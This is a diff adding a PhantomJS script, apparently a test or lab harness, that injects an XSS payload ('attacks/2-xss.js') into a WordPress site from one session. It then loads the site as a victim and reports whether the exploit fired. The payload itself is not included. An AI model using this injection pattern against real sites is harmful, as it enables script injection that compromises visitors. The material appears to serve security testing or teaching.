@@ -1,0 +1,54 @@
+#!/usr/bin/env phantomjs
+
+var wp = require( './wp' );
+
+var victimPage = wp.page( 'VICTIM' );
+var maliciousPage = wp.page( 'MALICIOUS' );
+
+var success = false;
+
+victimPage.onAlert = function( msg ) {
+	success = true;
+};
+
+setTimeout( function() {
+	if ( success ) {
+		console.log( "XSS Successfully Exploited" );
+		phantom.exit();
+	} else {
+		console.log( "XSS Unsuccessfully Exploited" );
+		phantom.exit( 1 );
+	}
+}, 6000 );
+
+function clearPoll( page ) {
+	return function() {
+		page.evaluate( function() {
+			var clearIt = function() {
+				if ( 'undefined' !== window.ajax_poll_interval ) {
+					clearInterval( window.ajax_poll_interval );
+				}
+			}
+			clearIt();
+			setTimeout( clearIt, 200 );
+		} );
+	};
+};
+
+maliciousPage.onLoadFinished = clearPoll( maliciousPage );
+victimPage.onLoadFinished = clearPoll( victimPage );
+
+console.log( "Malicious: loading homepage" );
+maliciousPage.open( wp.url, function() {
+	console.log( "Malicious: injecting attacks/2-xss.js" );
+	maliciousPage.evaluate( function( url ) {
+		jQuery.getScript( url + 'attacks/2-xss.js' );
+	}, wp.url );
+
+	setTimeout( function() {
+		phantom.clearCookies();
+
+		console.log( "Victim: loading homepage" );
+		victimPage.open( wp.url );
+	}, 3000 );
+} );
